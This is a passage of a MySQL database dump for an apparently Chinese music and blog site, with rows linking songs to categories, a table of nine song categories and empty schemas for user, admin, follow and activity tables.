INSERT INTO `song_bind_song_category` VALUES (232, 83, 3, '2018-08-24 14:15:59', '2018-08-24 14:15:59');
INSERT INTO `song_bind_song_category` VALUES (233, 84, 3, '2018-08-24 14:17:01', '2018-08-24 14:17:01');
INSERT INTO `song_bind_song_category` VALUES (234, 84, 5, '2018-08-24 14:17:01', '2018-08-24 14:17:01');
INSERT INTO `song_bind_song_category` VALUES (235, 85, 6, '2018-08-24 14:18:00', '2018-08-24 14:18:00');
INSERT INTO `song_bind_song_category` VALUES (236, 85, 7, '2018-08-24 14:18:00', '2018-08-24 14:18:00');
INSERT INTO `song_bind_song_category` VALUES (237, 85, 9, '2018-08-24 14:18:00', '2018-08-24 14:18:00');
INSERT INTO `song_bind_song_category` VALUES (238, 86, 7, '2018-08-24 14:19:15', '2018-08-24 14:19:15');
INSERT INTO `song_bind_song_category` VALUES (239, 87, 8, '2018-08-24 14:20:30', '2018-08-24 14:20:30');
INSERT INTO `song_bind_song_category` VALUES (240, 87, 5, '2018-08-24 14:20:30', '2018-08-24 14:20:30');
INSERT INTO `song_bind_song_category` VALUES (241, 87, 3, '2018-08-24 14:20:30', '2018-08-24 14:20:30');
INSERT INTO `song_bind_song_category` VALUES (242, 87, 1, '2018-08-24 14:20:30', '2018-08-24 14:20:30');
INSERT INTO `song_bind_song_category` VALUES (248, 90, 7, '2018-08-24 14:25:22', '2018-08-24 14:25:22');
INSERT INTO `song_bind_song_category` VALUES (249, 90, 5, '2018-08-24 14:25:22', '2018-08-24 14:25:22');
INSERT INTO `song_bind_song_category` VALUES (250, 91, 5, '2018-08-24 14:26:07', '2018-08-24 14:26:07');
INSERT INTO `song_bind_song_category` VALUES (251, 91, 3, '2018-08-24 14:26:07', '2018-08-24 14:26:07');
INSERT INTO `song_bind_song_category` VALUES (252, 89, 7, '2018-08-24 14:26:31', '2018-08-24 14:26:31');
INSERT INTO `song_bind_song_category` VALUES (253, 92, 9, '2018-08-24 14:27:31', '2018-08-24 14:27:31');
INSERT INTO `song_bind_song_category` VALUES (254, 92, 7, '2018-08-24 14:27:31', '2018-08-24 14:27:31');
INSERT INTO `song_bind_song_category` VALUES (255, 92, 6, '2018-08-24 14:27:31', '2018-08-24 14:27:31');
INSERT INTO `song_bind_song_category` VALUES (256, 92, 1, '2018-08-24 14:27:31', '2018-08-24 14:27:31');
INSERT INTO `song_bind_song_category` VALUES (259, 93, 1, '2018-08-24 14:29:45', '2018-08-24 14:29:45');
INSERT INTO `song_bind_song_category` VALUES (260, 93, 7, '2018-08-24 14:29:45', '2018-08-24 14:29:45');
INSERT INTO `song_bind_song_category` VALUES (261, 93, 9, '2018-08-24 14:29:45', '2018-08-24 14:29:45');
INSERT INTO `song_bind_song_category` VALUES (262, 94, 7, '2018-08-24 14:31:25', '2018-08-24 14:31:25');
INSERT INTO `song_bind_song_category` VALUES (263, 94, 9, '2018-08-24 14:31:25', '2018-08-24 14:31:25');
INSERT INTO `song_bind_song_category` VALUES (264, 95, 8, '2018-08-24 14:32:09', '2018-08-24 14:32:09');
INSERT INTO `song_bind_song_category` VALUES (265, 95, 7, '2018-08-24 14:32:09', '2018-08-24 14:32:09');
INSERT INTO `song_bind_song_category` VALUES (266, 96, 3, '2018-08-24 14:33:03', '2018-08-24 14:33:03');
INSERT INTO `song_bind_song_category` VALUES (267, 96, 5, '2018-08-24 14:33:03', '2018-08-24 14:33:03');
INSERT INTO `song_bind_song_category` VALUES (268, 97, 2, '2018-08-24 14:34:03', '2018-08-24 14:34:03');
INSERT INTO `song_bind_song_category` VALUES (269, 98, 2, '2018-08-24 14:35:37', '2018-08-24 14:35:37');
INSERT INTO `song_bind_song_category` VALUES (273, 99, 9, '2018-08-24 14:37:23', '2018-08-24 14:37:23');
INSERT INTO `song_bind_song_category` VALUES (274, 100, 1, '2018-08-24 14:38:17', '2018-08-24 14:38:17');
INSERT INTO `song_bind_song_category` VALUES (275, 100, 7, '2018-08-24 14:38:17', '2018-08-24 14:38:17');
INSERT INTO `song_bind_song_category` VALUES (276, 100, 8, '2018-08-24 14:38:17', '2018-08-24 14:38:17');
INSERT INTO `song_bind_song_category` VALUES (279, 101, 2, '2018-08-24 14:45:14', '2018-08-24 14:45:14');
INSERT INTO `song_bind_song_category` VALUES (280, 102, 2, '2018-08-24 14:46:51', '2018-08-24 14:46:51');
INSERT INTO `song_bind_song_category` VALUES (281, 103, 3, '2018-08-24 14:48:30', '2018-08-24 14:48:30');
INSERT INTO `song_bind_song_category` VALUES (282, 103, 1, '2018-08-24 14:48:30', '2018-08-24 14:48:30');
INSERT INTO `song_bind_song_category` VALUES (283, 104, 9, '2018-08-24 14:50:48', '2018-08-24 14:50:48');
INSERT INTO `song_bind_song_category` VALUES (284, 105, 1, '2018-08-24 14:51:54', '2018-08-24 14:51:54');
INSERT INTO `song_bind_song_category` VALUES (285, 105, 3, '2018-08-24 14:51:54', '2018-08-24 14:51:54');
INSERT INTO `song_bind_song_category` VALUES (286, 106, 3, '2018-08-24 14:52:55', '2018-08-24 14:52:55');
INSERT INTO `song_bind_song_category` VALUES (287, 106, 5, '2018-08-24 14:52:55', '2018-08-24 14:52:55');
INSERT INTO `song_bind_song_category` VALUES (288, 107, 7, '2018-08-24 14:54:25', '2018-08-24 14:54:25');
INSERT INTO `song_bind_song_category` VALUES (289, 107, 8, '2018-08-24 14:54:25', '2018-08-24 14:54:25');
INSERT INTO `song_bind_song_category` VALUES (290, 108, 1, '2018-08-24 14:55:27', '2018-08-24 14:55:27');
INSERT INTO `song_bind_song_category` VALUES (291, 108, 2, '2018-08-24 14:55:27', '2018-08-24 14:55:27');
INSERT INTO `song_bind_song_category` VALUES (292, 109, 1, '2018-08-24 14:57:05', '2018-08-24 14:57:05');
INSERT INTO `song_bind_song_category` VALUES (293, 109, 7, '2018-08-24 14:57:05', '2018-08-24 14:57:05');
INSERT INTO `song_bind_song_category` VALUES (294, 109, 8, '2018-08-24 14:57:05', '2018-08-24 14:57:05');
INSERT INTO `song_bind_song_category` VALUES (295, 110, 2, '2018-08-24 15:00:38', '2018-08-24 15:00:38');
INSERT INTO `song_bind_song_category` VALUES (296, 110, 1, '2018-08-24 15:00:38', '2018-08-24 15:00:38');
INSERT INTO `song_bind_song_category` VALUES (297, 111, 7, '2018-08-24 15:01:30', '2018-08-24 15:01:30');
INSERT INTO `song_bind_song_category` VALUES (300, 112, 1, '2018-08-24 15:03:21', '2018-08-24 15:03:21');
INSERT INTO `song_bind_song_category` VALUES (301, 112, 6, '2018-08-24 15:03:21', '2018-08-24 15:03:21');
INSERT INTO `song_bind_song_category` VALUES (302, 112, 7, '2018-08-24 15:03:21', '2018-08-24 15:03:21');
INSERT INTO `song_bind_song_category` VALUES (303, 112, 9, '2018-08-24 15:03:21', '2018-08-24 15:03:21');
INSERT INTO `song_bind_song_category` VALUES (304, 113, 5, '2018-08-24 15:05:14', '2018-08-24 15:05:14');
INSERT INTO `song_bind_song_category` VALUES (305, 113, 3, '2018-08-24 15:05:14', '2018-08-24 15:05:14');
INSERT INTO `song_bind_song_category` VALUES (306, 114, 9, '2018-08-24 15:06:10', '2018-08-24 15:06:10');
INSERT INTO `song_bind_song_category` VALUES (307, 114, 7, '2018-08-24 15:06:10', '2018-08-24 15:06:10');
INSERT INTO `song_bind_song_category` VALUES (308, 115, 3, '2018-08-24 15:06:59', '2018-08-24 15:06:59');
INSERT INTO `song_bind_song_category` VALUES (309, 115, 5, '2018-08-24 15:06:59', '2018-08-24 15:06:59');
INSERT INTO `song_bind_song_category` VALUES (310, 116, 3, '2018-08-24 15:08:22', '2018-08-24 15:08:22');
INSERT INTO `song_bind_song_category` VALUES (311, 116, 1, '2018-08-24 15:08:22', '2018-08-24 15:08:22');
INSERT INTO `song_bind_song_category` VALUES (312, 117, 3, '2018-08-24 15:09:43', '2018-08-24 15:09:43');
INSERT INTO `song_bind_song_category` VALUES (313, 117, 1, '2018-08-24 15:09:43', '2018-08-24 15:09:43');
INSERT INTO `song_bind_song_category` VALUES (314, 118, 7, '2018-08-24 15:11:20', '2018-08-24 15:11:20');
INSERT INTO `song_bind_song_category` VALUES (315, 119, 3, '2018-08-24 15:12:04', '2018-08-24 15:12:04');
INSERT INTO `song_bind_song_category` VALUES (316, 120, 1, '2018-08-24 15:13:11', '2018-08-24 15:13:11');
INSERT INTO `song_bind_song_category` VALUES (317, 120, 2, '2018-08-24 15:13:11', '2018-08-24 15:13:11');
INSERT INTO `song_bind_song_category` VALUES (318, 121, 2, '2018-08-24 15:14:54', '2018-08-24 15:14:54');
INSERT INTO `song_bind_song_category` VALUES (319, 121, 1, '2018-08-24 15:14:54', '2018-08-24 15:14:54');
INSERT INTO `song_bind_song_category` VALUES (320, 122, 9, '2018-08-24 15:16:24', '2018-08-24 15:16:24');
INSERT INTO `song_bind_song_category` VALUES (321, 122, 7, '2018-08-24 15:16:24', '2018-08-24 15:16:24');
INSERT INTO `song_bind_song_category` VALUES (322, 123, 8, '2018-08-24 15:17:16', '2018-08-24 15:17:16');
INSERT INTO `song_bind_song_category` VALUES (323, 123, 7, '2018-08-24 15:17:16', '2018-08-24 15:17:16');
INSERT INTO `song_bind_song_category` VALUES (324, 124, 7, '2018-08-24 15:18:17', '2018-08-24 15:18:17');
INSERT INTO `song_bind_song_category` VALUES (325, 124, 6, '2018-08-24 15:18:17', '2018-08-24 15:18:17');
INSERT INTO `song_bind_song_category` VALUES (326, 125, 7, '2018-08-24 15:19:46', '2018-08-24 15:19:46');
INSERT INTO `song_bind_song_category` VALUES (327, 125, 6, '2018-08-24 15:19:46', '2018-08-24 15:19:46');
INSERT INTO `song_bind_song_category` VALUES (328, 125, 1, '2018-08-24 15:19:46', '2018-08-24 15:19:46');
INSERT INTO `song_bind_song_category` VALUES (329, 125, 5, '2018-08-24 15:19:46', '2018-08-24 15:19:46');
INSERT INTO `song_bind_song_category` VALUES (330, 126, 7, '2018-08-24 15:20:22', '2018-08-24 15:20:22');
INSERT INTO `song_bind_song_category` VALUES (331, 126, 3, '2018-08-24 15:20:22', '2018-08-24 15:20:22');
INSERT INTO `song_bind_song_category` VALUES (332, 126, 5, '2018-08-24 15:20:22', '2018-08-24 15:20:22');
INSERT INTO `song_bind_song_category` VALUES (333, 127, 1, '2018-08-24 15:22:18', '2018-08-24 15:22:18');
INSERT INTO `song_bind_song_category` VALUES (334, 127, 3, '2018-08-24 15:22:18', '2018-08-24 15:22:18');
INSERT INTO `song_bind_song_category` VALUES (335, 128, 1, '2018-08-24 15:23:13', '2018-08-24 15:23:13');
INSERT INTO `song_bind_song_category` VALUES (336, 128, 7, '2018-08-24 15:23:13', '2018-08-24 15:23:13');
INSERT INTO `song_bind_song_category` VALUES (337, 128, 4, '2018-08-24 15:23:13', '2018-08-24 15:23:13');
INSERT INTO `song_bind_song_category` VALUES (338, 129, 1, '2018-08-24 15:24:44', '2018-08-24 15:24:44');
INSERT INTO `song_bind_song_category` VALUES (339, 129, 7, '2018-08-24 15:24:44', '2018-08-24 15:24:44');
INSERT INTO `song_bind_song_category` VALUES (340, 129, 4, '2018-08-24 15:24:44', '2018-08-24 15:24:44');
INSERT INTO `song_bind_song_category` VALUES (341, 130, 6, '2018-08-24 15:26:38', '2018-08-24 15:26:38');
INSERT INTO `song_bind_song_category` VALUES (342, 130, 7, '2018-08-24 15:26:38', '2018-08-24 15:26:38');
INSERT INTO `song_bind_song_category` VALUES (343, 131, 2, '2018-08-24 15:28:17', '2018-08-24 15:28:17');
INSERT INTO `song_bind_song_category` VALUES (344, 132, 3, '2018-08-24 15:29:11', '2018-08-24 15:29:11');
INSERT INTO `song_bind_song_category` VALUES (345, 132, 5, '2018-08-24 15:29:11', '2018-08-24 15:29:11');
INSERT INTO `song_bind_song_category` VALUES (346, 133, 2, '2018-08-24 15:30:30', '2018-08-24 15:30:30');
INSERT INTO `song_bind_song_category` VALUES (347, 134, 6, '2018-08-24 15:31:18', '2018-08-24 15:31:18');
INSERT INTO `song_bind_song_category` VALUES (348, 134, 7, '2018-08-24 15:31:18', '2018-08-24 15:31:18');
INSERT INTO `song_bind_song_category` VALUES (353, 135, 1, '2018-08-24 15:33:05', '2018-08-24 15:33:05');
INSERT INTO `song_bind_song_category` VALUES (354, 135, 3, '2018-08-24 15:33:05', '2018-08-24 15:33:05');
INSERT INTO `song_bind_song_category` VALUES (355, 135, 5, '2018-08-24 15:33:05', '2018-08-24 15:33:05');
INSERT INTO `song_bind_song_category` VALUES (358, 136, 1, '2018-08-24 15:34:17', '2018-08-24 15:34:17');
INSERT INTO `song_bind_song_category` VALUES (359, 136, 4, '2018-08-24 15:34:17', '2018-08-24 15:34:17');
INSERT INTO `song_bind_song_category` VALUES (360, 136, 7, '2018-08-24 15:34:17', '2018-08-24 15:34:17');
INSERT INTO `song_bind_song_category` VALUES (361, 137, 3, '2018-08-24 15:35:28', '2018-08-24 15:35:28');
INSERT INTO `song_bind_song_category` VALUES (362, 138, 7, '2018-08-24 15:37:06', '2018-08-24 15:37:06');
INSERT INTO `song_bind_song_category` VALUES (363, 138, 6, '2018-08-24 15:37:06', '2018-08-24 15:37:06');
INSERT INTO `song_bind_song_category` VALUES (364, 139, 3, '2018-08-24 15:38:12', '2018-08-24 15:38:12');
INSERT INTO `song_bind_song_category` VALUES (365, 140, 3, '2018-08-24 15:40:16', '2018-08-24 15:40:16');
INSERT INTO `song_bind_song_category` VALUES (366, 140, 1, '2018-08-24 15:40:16', '2018-08-24 15:40:16');
INSERT INTO `song_bind_song_category` VALUES (367, 141, 6, '2018-08-24 15:41:12', '2018-08-24 15:41:12');
INSERT INTO `song_bind_song_category` VALUES (368, 141, 7, '2018-08-24 15:41:12', '2018-08-24 15:41:12');
INSERT INTO `song_bind_song_category` VALUES (369, 141, 1, '2018-08-24 15:41:12', '2018-08-24 15:41:12');
INSERT INTO `song_bind_song_category` VALUES (370, 142, 1, '2018-08-24 15:42:36', '2018-08-24 15:42:36');
INSERT INTO `song_bind_song_category` VALUES (371, 142, 2, '2018-08-24 15:42:36', '2018-08-24 15:42:36');
INSERT INTO `song_bind_song_category` VALUES (372, 143, 1, '2018-08-24 15:43:57', '2018-08-24 15:43:57');
INSERT INTO `song_bind_song_category` VALUES (373, 143, 2, '2018-08-24 15:43:57', '2018-08-24 15:43:57');
INSERT INTO `song_bind_song_category` VALUES (374, 144, 9, '2018-08-24 15:45:09', '2018-08-24 15:45:09');
INSERT INTO `song_bind_song_category` VALUES (375, 144, 7, '2018-08-24 15:45:09', '2018-08-24 15:45:09');
INSERT INTO `song_bind_song_category` VALUES (376, 145, 9, '2018-08-24 15:46:21', '2018-08-24 15:46:21');
INSERT INTO `song_bind_song_category` VALUES (377, 145, 7, '2018-08-24 15:46:21', '2018-08-24 15:46:21');
INSERT INTO `song_bind_song_category` VALUES (378, 146, 9, '2018-08-24 15:47:06', '2018-08-24 15:47:06');
INSERT INTO `song_bind_song_category` VALUES (379, 146, 7, '2018-08-24 15:47:06', '2018-08-24 15:47:06');
INSERT INTO `song_bind_song_category` VALUES (380, 147, 6, '2018-08-24 15:48:02', '2018-08-24 15:48:02');
INSERT INTO `song_bind_song_category` VALUES (381, 147, 7, '2018-08-24 15:48:02', '2018-08-24 15:48:02');
INSERT INTO `song_bind_song_category` VALUES (382, 147, 1, '2018-08-24 15:48:02', '2018-08-24 15:48:02');
INSERT INTO `song_bind_song_category` VALUES (383, 148, 1, '2018-08-24 17:11:59', '2018-08-24 17:11:59');
INSERT INTO `song_bind_song_category` VALUES (384, 148, 2, '2018-08-24 17:11:59', '2018-08-24 17:11:59');
INSERT INTO `song_bind_song_category` VALUES (385, 149, 1, '2018-08-24 17:15:23', '2018-08-24 17:15:23');
INSERT INTO `song_bind_song_category` VALUES (386, 149, 2, '2018-08-24 17:15:23', '2018-08-24 17:15:23');
INSERT INTO `song_bind_song_category` VALUES (387, 150, 1, '2018-08-24 17:17:08', '2018-08-24 17:17:08');
INSERT INTO `song_bind_song_category` VALUES (388, 150, 2, '2018-08-24 17:17:08', '2018-08-24 17:17:08');
INSERT INTO `song_bind_song_category` VALUES (389, 151, 3, '2018-08-24 17:19:40', '2018-08-24 17:19:40');
INSERT INTO `song_bind_song_category` VALUES (390, 151, 5, '2018-08-24 17:19:40', '2018-08-24 17:19:40');
INSERT INTO `song_bind_song_category` VALUES (391, 152, 1, '2018-08-24 17:21:15', '2018-08-24 17:21:15');
INSERT INTO `song_bind_song_category` VALUES (392, 152, 2, '2018-08-24 17:21:15', '2018-08-24 17:21:15');
INSERT INTO `song_bind_song_category` VALUES (393, 153, 1, '2018-08-24 17:22:05', '2018-08-24 17:22:05');
INSERT INTO `song_bind_song_category` VALUES (394, 153, 2, '2018-08-24 17:22:05', '2018-08-24 17:22:05');
INSERT INTO `song_bind_song_category` VALUES (395, 154, 1, '2018-08-24 17:23:42', '2018-08-24 17:23:42');
INSERT INTO `song_bind_song_category` VALUES (396, 154, 2, '2018-08-24 17:23:42', '2018-08-24 17:23:42');
INSERT INTO `song_bind_song_category` VALUES (400, 156, 2, '2018-08-24 17:30:35', '2018-08-24 17:30:35');
INSERT INTO `song_bind_song_category` VALUES (401, 156, 1, '2018-08-24 17:30:35', '2018-08-24 17:30:35');
INSERT INTO `song_bind_song_category` VALUES (402, 157, 6, '2018-08-24 17:32:21', '2018-08-24 17:32:21');
INSERT INTO `song_bind_song_category` VALUES (403, 157, 7, '2018-08-24 17:32:21', '2018-08-24 17:32:21');
INSERT INTO `song_bind_song_category` VALUES (404, 157, 9, '2018-08-24 17:32:21', '2018-08-24 17:32:21');
INSERT INTO `song_bind_song_category` VALUES (405, 157, 1, '2018-08-24 17:32:21', '2018-08-24 17:32:21');
INSERT INTO `song_bind_song_category` VALUES (410, 158, 1, '2018-08-24 17:34:07', '2018-08-24 17:34:07');
INSERT INTO `song_bind_song_category` VALUES (411, 158, 2, '2018-08-24 17:34:07', '2018-08-24 17:34:07');
INSERT INTO `song_bind_song_category` VALUES (412, 158, 8, '2018-08-24 17:34:07', '2018-08-24 17:34:07');
INSERT INTO `song_bind_song_category` VALUES (413, 159, 2, '2018-08-24 17:35:04', '2018-08-24 17:35:04');
INSERT INTO `song_bind_song_category` VALUES (414, 160, 2, '2018-08-24 17:36:36', '2018-08-24 17:36:36');
INSERT INTO `song_bind_song_category` VALUES (415, 160, 1, '2018-08-24 17:36:36', '2018-08-24 17:36:36');
INSERT INTO `song_bind_song_category` VALUES (416, 161, 1, '2018-08-24 17:38:02', '2018-08-24 17:38:02');
INSERT INTO `song_bind_song_category` VALUES (417, 161, 3, '2018-08-24 17:38:02', '2018-08-24 17:38:02');
INSERT INTO `song_bind_song_category` VALUES (418, 4, 1, '2018-08-24 17:40:08', '2018-08-24 17:40:08');
INSERT INTO `song_bind_song_category` VALUES (419, 4, 3, '2018-08-24 17:40:08', '2018-08-24 17:40:08');
INSERT INTO `song_bind_song_category` VALUES (420, 88, 3, '2018-08-28 19:05:15', '2018-08-28 19:05:15');
INSERT INTO `song_bind_song_category` VALUES (421, 88, 5, '2018-08-28 19:05:15', '2018-08-28 19:05:15');
INSERT INTO `song_bind_song_category` VALUES (422, 162, 1, '2018-09-24 21:57:26', '2018-09-24 21:57:26');
INSERT INTO `song_bind_song_category` VALUES (423, 162, 3, '2018-09-24 21:57:26', '2018-09-24 21:57:26');
INSERT INTO `song_bind_song_category` VALUES (424, 163, 1, '2019-01-14 10:43:42', '2019-01-14 10:43:42');
INSERT INTO `song_bind_song_category` VALUES (425, 163, 6, '2019-01-14 10:43:42', '2019-01-14 10:43:42');
INSERT INTO `song_bind_song_category` VALUES (426, 163, 7, '2019-01-14 10:43:42', '2019-01-14 10:43:42');

-- ----------------------------
-- Table structure for song_category
-- ----------------------------
DROP TABLE IF EXISTS `song_category`;
CREATE TABLE `song_category`  (
  `id` int(0) UNSIGNED NOT NULL AUTO_INCREMENT COMMENT '歌曲分类主键id',
  `name` varchar(255) CHARACTER SET utf8 COLLATE utf8_general_ci NOT NULL COMMENT '分类名称',
  `desc` varchar(255) CHARACTER SET utf8 COLLATE utf8_general_ci NOT NULL DEFAULT '' COMMENT '分类描述',
  `create_time` datetime(0) NOT NULL DEFAULT CURRENT_TIMESTAMP(0),
  PRIMARY KEY (`id`) USING BTREE
) ENGINE = InnoDB AUTO_INCREMENT = 10 CHARACTER SET = utf8 COLLATE = utf8_general_ci ROW_FORMAT = Dynamic;

-- ----------------------------
-- Records of song_category
-- ----------------------------
INSERT INTO `song_category` VALUES (1, '推荐', '', '2018-08-17 13:06:48');
INSERT INTO `song_category` VALUES (2, '欧美', '', '2018-08-17 13:06:53');
INSERT INTO `song_category` VALUES (3, '日文', '', '2018-08-17 15:58:11');
INSERT INTO `song_category` VALUES (4, '乐器', '', '2018-08-23 20:01:18');
INSERT INTO `song_category` VALUES (5, '动漫', '', '2018-08-23 20:03:18');
INSERT INTO `song_category` VALUES (6, '轻快纯音', '', '2018-08-23 20:04:15');
INSERT INTO `song_category` VALUES (7, '纯音', '', '2018-08-18 11:12:44');
INSERT INTO `song_category` VALUES (8, '燃系', '', '2018-08-23 19:55:45');
INSERT INTO `song_category` VALUES (9, '电音', '', '2018-08-23 19:57:33');

-- ----------------------------
-- Table structure for sys_user
-- ----------------------------
DROP TABLE IF EXISTS `sys_user`;
CREATE TABLE `sys_user`  (
  `id` int(0) UNSIGNED NOT NULL AUTO_INCREMENT COMMENT '后台用户主键id',
  `user_id` int(0) NOT NULL COMMENT '前台的用户id',
  `username` varchar(20) CHARACTER SET utf8 COLLATE utf8_general_ci NOT NULL DEFAULT '' COMMENT '用户名称,用于登陆,后台用户没有昵称',
  `password` varchar(50) CHARACTER SET utf8 COLLATE utf8_general_ci NOT NULL DEFAULT '' COMMENT '用户密码',
  `avatar` varchar(100) CHARACTER SET utf8 COLLATE utf8_general_ci NOT NULL DEFAULT '' COMMENT '后台用户的头像',
  `operate_time` datetime(0) NOT NULL DEFAULT CURRENT_TIMESTAMP(0) COMMENT '最后一次操作的时间',
  `operate_ip` varchar(50) CHARACTER SET utf8 COLLATE utf8_general_ci NOT NULL DEFAULT '' COMMENT '最后一次操作的ip',
  `create_time` datetime(0) NOT NULL DEFAULT CURRENT_TIMESTAMP(0) COMMENT '用户创建的时间',
  PRIMARY KEY (`id`) USING BTREE
) ENGINE = InnoDB AUTO_INCREMENT = 2 CHARACTER SET = utf8 COLLATE = utf8_general_ci COMMENT = '后台用户的数据表' ROW_FORMAT = Dynamic;

-- ----------------------------
-- Records of sys_user
-- ----------------------------

-- ----------------------------
-- Table structure for user
-- ----------------------------
DROP TABLE IF EXISTS `user`;
CREATE TABLE `user`  (
  `id` int(0) UNSIGNED NOT NULL AUTO_INCREMENT COMMENT '用户主键id',
  `username` varchar(20) CHARACTER SET utf8 COLLATE utf8_general_ci NOT NULL DEFAULT '' COMMENT '用户登陆名称',
  `email` varchar(50) CHARACTER SET utf8 COLLATE utf8_general_ci NOT NULL DEFAULT '' COMMENT '用户登陆,找回密码,激活状态的邮箱',
  `password` varchar(50) CHARACTER SET utf8 COLLATE utf8_general_ci NOT NULL DEFAULT '' COMMENT '用户登陆密码',
  `nickname` varchar(20) CHARACTER SET utf8 COLLATE utf8_general_ci NOT NULL DEFAULT '' COMMENT '用户昵称,第一次为用户注册时的登陆名称',
  `desc` varchar(255) CHARACTER SET utf8 COLLATE utf8_general_ci NOT NULL DEFAULT '' COMMENT '用户个人描述',
  `website` varchar(50) CHARACTER SET utf8 COLLATE utf8_general_ci NOT NULL DEFAULT '' COMMENT '用户的网站',
  `avatar` varchar(255) CHARACTER SET utf8 COLLATE utf8_general_ci NOT NULL DEFAULT '' COMMENT '用户的头像地址',
  `praise` int(0) NOT NULL DEFAULT 0 COMMENT '用户被赞数,游客也可以点击',
  `status` int(0) NOT NULL DEFAULT 0 COMMENT '用户的状态.0:正常,1:被禁封',
  `activation_code` varchar(255) CHARACTER SET utf8 COLLATE utf8_general_ci NOT NULL DEFAULT '' COMMENT '邮件激活的密钥',
  `activation_status` int(0) NOT NULL DEFAULT 0 COMMENT '用户注册后的激活状态.0:未激活,1:激活',
  `follower_sum` int(0) NOT NULL DEFAULT 0 COMMENT '用户的关注数量,通过user_follow数据表获得',
  `fans_sum` int(0) NOT NULL DEFAULT 0 COMMENT '用户的粉丝数量,通过user_follow数据表获得',
  `comment_sum` int(0) NOT NULL DEFAULT 0 COMMENT '用户的评论数量,评论后由消息队列进行更新',
  `article_sum` int(0) UNSIGNED NOT NULL DEFAULT 0 COMMENT '用户的文章数量,添加文章后更新',
  `before_login_ip` varchar(20) CHARACTER SET utf8 COLLATE utf8_general_ci NOT NULL DEFAULT '' COMMENT '用户上次登陆的ip',
  `now_login_ip` varchar(20) CHARACTER SET utf8 COLLATE utf8_general_ci NOT NULL DEFAULT '' COMMENT '用户本次登陆的ip',
  `create_time` datetime(0) NOT NULL DEFAULT CURRENT_TIMESTAMP(0) COMMENT '用户创建的时间',
  `operate_time` datetime(0) NOT NULL DEFAULT CURRENT_TIMESTAMP(0) COMMENT '用户最后一次操作的时间',
  PRIMARY KEY (`id`) USING BTREE
) ENGINE = InnoDB AUTO_INCREMENT = 20 CHARACTER SET = utf8 COLLATE = utf8_general_ci COMMENT = '用户的数据表' ROW_FORMAT = Dynamic;

-- ----------------------------
-- Records of user
-- ----------------------------

-- ----------------------------
-- Table structure for user_follow
-- ----------------------------
DROP TABLE IF EXISTS `user_follow`;
CREATE TABLE `user_follow`  (
  `id` int(0) UNSIGNED NOT NULL AUTO_INCREMENT COMMENT '用户关注关系主键id',
  `from_id` int(0) NOT NULL COMMENT '来自者的id',
  `target_id` int(0) NOT NULL COMMENT '目标的id',
  `follow_status` int(0) NOT NULL DEFAULT 0 COMMENT '关注的状态.1:关注,2:不关注',
  PRIMARY KEY (`id`) USING BTREE
) ENGINE = InnoDB AUTO_INCREMENT = 10 CHARACTER SET = utf8 COLLATE = utf8_general_ci COMMENT = '用户关注关系的数据表' ROW_FORMAT = Dynamic;

-- ----------------------------
-- Records of user_follow
-- ----------------------------

-- ----------------------------
-- Table structure for user_initiate_dynamic
-- ----------------------------
DROP TABLE IF EXISTS `user_initiate_dynamic`;
CREATE TABLE `user_initiate_dynamic`  (
  `id` int(0) UNSIGNED NOT NULL AUTO_INCREMENT COMMENT '动态发起主键id',
  `type` int(0) NOT NULL DEFAULT 0 COMMENT '动态类型.1:评论相关,2:文章相关',
  `action` int(0) NOT NULL DEFAULT 0 COMMENT '动态动作.1:提出,2回复另一个评论',
  `type_id` int(0) NOT NULL COMMENT '动态类型的id,可能是文章或者是评论,取决于type字段',
  `initiate_user_id` int(0) NOT NULL COMMENT '动态发起者的id',
  `create_time` datetime(0) NOT NULL DEFAULT CURRENT_TIMESTAMP(0) COMMENT '创建动态的时间',
  PRIMARY KEY (`id`) USING BTREE
) ENGINE = InnoDB AUTO_INCREMENT = 10 CHARACTER SET = utf8 COLLATE = utf8_general_ci COMMENT = '动态数据表.用于监视用户的动作' ROW_FORMAT = Dynamic;

-- ----------------------------
-- Records of user_initiate_dynamic
-- ----------------------------

-- ----------------------------
-- Table structure for user_receive_dynamic
-- ----------------------------
DROP TABLE IF EXISTS `user_receive_dynamic`;
CREATE TABLE `user_receive_dynamic`  (
  `id` int(0) UNSIGNED NOT NULL AUTO_INCREMENT COMMENT '动态接收主键id',
  `initiate_dynamic_id` int(0) NOT NULL COMMENT '动态发起的id',
  `receive_user_id` int(0) NOT NULL COMMENT '动态接收者的id',
  `create_time` datetime(0) NOT NULL DEFAULT CURRENT_TIMESTAMP(0) COMMENT '创建动态的时间',
  `visit` int(0) NOT NULL DEFAULT 0 COMMENT '用户是否看过这条动态,0:没看过,1:看过',
  PRIMARY KEY (`id`) USING BTREE
) ENGINE = InnoDB AUTO_INCREMENT = 6 CHARACTER SET = utf8 COLLATE = utf8_general_ci ROW_FORMAT = Dynamic;

-- ----------------------------
-- Records of user_receive_dynamic
-- ----------------------------

SET FOREIGN_KEY_CHECKS = 1;
